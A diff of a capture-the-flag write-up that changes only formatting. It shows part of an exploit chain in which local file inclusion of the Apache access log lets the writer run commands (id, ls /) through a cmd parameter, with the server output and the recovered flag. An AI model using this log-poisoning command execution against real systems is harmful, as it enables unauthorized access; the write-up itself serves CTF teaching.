@@ -39,7 +39,9 @@ Connection: close
 
 Now, I just have to add `&cmd=` as a parameter to my query in order to perform RCE: `http://01.linux.challenges.ctf.thefewchosen.com:49412/?file=/var/log/apache2/access.log&cmd=id`
 
-`[30/Jul/2022:12:33:33 +0000] "GET /?file=/var/log/apache2/access.log HTTP/1.1" 200 772 "-" "Mozilla/5.0 uid=33(www-data) gid=33(www-data) groups=33(www-data) Safari/537.36"`
+```
+[30/Jul/2022:12:33:33 +0000] "GET /?file=/var/log/apache2/access.log HTTP/1.1" 200 772 "-" "Mozilla/5.0 uid=33(www-data) gid=33(www-data) groups=33(www-data) Safari/537.36"
+```
 
 I list the contents of the `/` directory: `http://01.linux.challenges.ctf.thefewchosen.com:49412/?file=/var/log/apache2/access.log&cmd=ls%20/`
 
@@ -49,4 +51,4 @@ I get the content of the flag : `http://01.linux.challenges.ctf.thefewchosen.com
 
 `30/Jul/2022:12:33:33 +0000] "GET /?file=/var/log/apache2/access.log HTTP/1.1" 200 772 "-" "Mozilla/5.0 TFCCTF{LF1_1S_D4NG3R0US_4ND_L34DS_T0_RC3} Safari/537.36"`
 
-Flag: TFCCTF{LF1_1S_D4NG3R0US_4ND_L34DS_T0_RC3}
+Flag: `TFCCTF{LF1_1S_D4NG3R0US_4ND_L34DS_T0_RC3}`
